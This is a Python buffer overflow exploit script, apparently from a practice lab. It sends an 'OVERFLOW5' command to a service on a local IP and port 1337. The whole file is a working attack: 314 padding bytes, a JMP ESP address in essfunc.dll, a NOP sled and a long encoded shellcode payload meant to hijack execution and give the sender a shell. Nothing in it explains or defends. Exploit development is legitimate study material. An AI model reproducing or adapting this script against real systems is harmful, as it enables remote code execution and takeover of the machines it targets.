import socket
import sys
import time


print("[+] Nani???? Got a shell!!\n")

buff = "A" * 314
eip = "\xdf\x11\x50\x62" # 0x625011DF JMP ESP essfunc.dll

nops = "\x90" * 16

shellcode =  b""
shellcode += b"\xfc\xbb\x60\xe9\x5b\xeb\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x9c\x01\xd9\xeb\x5c\xd2\xbe\x62"
shellcode += b"\xb9\xe3\xfe\x11\xca\x54\xcf\x52\x9e\x58\xa4"
shellcode += b"\x37\x0a\xea\xc8\x9f\x3d\x5b\x66\xc6\x70\x5c"
shellcode += b"\xdb\x3a\x13\xde\x26\x6f\xf3\xdf\xe8\x62\xf2"
shellcode += b"\x18\x14\x8e\xa6\xf1\x52\x3d\x56\x75\x2e\xfe"
shellcode += b"\xdd\xc5\xbe\x86\x02\x9d\xc1\xa7\x95\x95\x9b"
shellcode += b"\x67\x14\x79\x90\x21\x0e\x9e\x9d\xf8\xa5\x54"
shellcode += b"\x69\xfb\x6f\xa5\x92\x50\x4e\x09\x61\xa8\x97"
shellcode += b"\xae\x9a\xdf\xe1\xcc\x27\xd8\x36\xae\xf3\x6d"
shellcode += b"\xac\x08\x77\xd5\x08\xa8\x54\x80\xdb\xa6\x11"
shellcode += b"\xc6\x83\xaa\xa4\x0b\xb8\xd7\x2d\xaa\x6e\x5e"
shellcode += b"\x75\x89\xaa\x3a\x2d\xb0\xeb\xe6\x80\xcd\xeb"
shellcode += b"\x48\x7c\x68\x60\x64\x69\x01\x2b\xe1\x5e\x28"
shellcode += b"\xd3\xf1\xc8\x3b\xa0\xc3\x57\x90\x2e\x68\x1f"
shellcode += b"\x3e\xa9\x8f\x0a\x86\x25\x6e\xb5\xf7\x6c\xb5"
shellcode += b"\xe1\xa7\x06\x1c\x8a\x23\xd6\xa1\x5f\xe3\x86"
shellcode += b"\x0d\x30\x44\x76\xee\xe0\x2c\x9c\xe1\xdf\x4d"
shellcode += b"\x9f\x2b\x48\xe7\x5a\xbc\xb7\x50\x65\xcd\x50"
shellcode += b"\xa3\x65\x2c\x1a\x2a\x83\x44\x4c\x7b\x1c\xf1"
shellcode += b"\xf5\x26\xd6\x60\xf9\xfc\x93\xa3\x71\xf3\x64"
shellcode += b"\x6d\x72\x7e\x76\x1a\x72\x35\x24\x8d\x8d\xe3"
shellcode += b"\x40\x51\x1f\x68\x90\x1c\x3c\x27\xc7\x49\xf2"
shellcode += b"\x3e\x8d\x67\xad\xe8\xb3\x75\x2b\xd2\x77\xa2"
shellcode += b"\x88\xdd\x76\x27\xb4\xf9\x68\xf1\x35\x46\xdc"
shellcode += b"\xad\x63\x10\x8a\x0b\xda\xd2\x64\xc2\xb1\xbc"
shellcode += b"\xe0\x93\xf9\x7e\x76\x9c\xd7\x08\x96\x2d\x8e"
shellcode += b"\x4c\xa9\x82\x46\x59\xd2\xfe\xf6\xa6\x09\xbb"
shellcode += b"\x17\x45\x9b\xb6\xbf\xd0\x4e\x7b\xa2\xe2\xa5"
shellcode += b"\xb8\xdb\x60\x4f\x41\x18\x78\x3a\x44\x64\x3e"
shellcode += b"\xd7\x34\xf5\xab\xd7\xeb\xf6\xf9\xd7\x0b\x09"
shellcode += b"\x02"

payload = buff + eip + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW5 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
